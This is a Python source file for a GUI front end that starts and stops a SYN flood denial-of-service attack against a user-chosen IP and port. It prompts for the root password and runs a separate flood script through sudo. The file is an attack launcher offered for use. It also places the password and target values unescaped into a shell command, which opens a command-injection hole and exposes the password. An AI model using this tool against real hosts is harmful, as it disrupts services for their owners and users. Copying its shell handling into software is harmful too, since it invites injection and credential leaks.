# syn_flood.py
import tkinter as tk
import customtkinter as ctk
import subprocess
import os
import signal
import threading

class SynFloodAttack:
    def __init__(self, text_box, stop_event, attack_threads):
        self.text_box = text_box
        self.stop_attack_event = stop_event
        self.attack_threads = attack_threads
        self.process = None

    def rerun_as_root(self, password, target_ip, target_port):
        """Rerun the script with sudo."""
        try:
            command = f"echo {password} | sudo -S python3 syn_flood_attack.py {target_ip} {target_port}"
            self.process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.text_box.insert(tk.END, "Attack started!\n")
        except subprocess.CalledProcessError as e:
            self.text_box.insert(tk.END, f"Failed to rerun script as root: {e}\n")

    def start_attack(self, target_ip, target_port):
        """Start the SYN flood attack."""
        self.text_box.delete("1.0", tk.END)  # Clear the initial instructions
        self.text_box.insert(tk.END, "Please wait while starting the attack...\n")
        self.prompt_password(target_ip, target_port)

    def stop_attack(self):
        """Stop the SYN flood attack."""
        self.stop_attack_event.set()
        self.text_box.insert(tk.END, "Stopping SYN flood attack...\n")
        if self.process:
            os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
            self.process.wait()
            self.process = None
        self.text_box.insert(tk.END, "Attack stopped!\n")

    def prompt_password(self, target_ip, target_port):
        """Prompt for root password."""
        dialog = ctk.CTkToplevel()
        dialog.title("Root Password Required")
        dialog.geometry("300x150")

        label = ctk.CTkLabel(dialog, text="Enter root password:", font=('Helvetica', 12))
        label.pack(pady=10)

        password_entry = ctk.CTkEntry(dialog, show="*", width=200)
        password_entry.pack(pady=5)

        def on_ok():
            password = password_entry.get()
            dialog.destroy()
            threading.Thread(target=self.rerun_as_root, args=(password, target_ip, target_port)).start()

        ok_button = ctk.CTkButton(dialog, text="OK", command=on_ok)
        ok_button.pack(pady=10)

        dialog.transient()
        dialog.grab_set()
        dialog.wait_window(dialog)
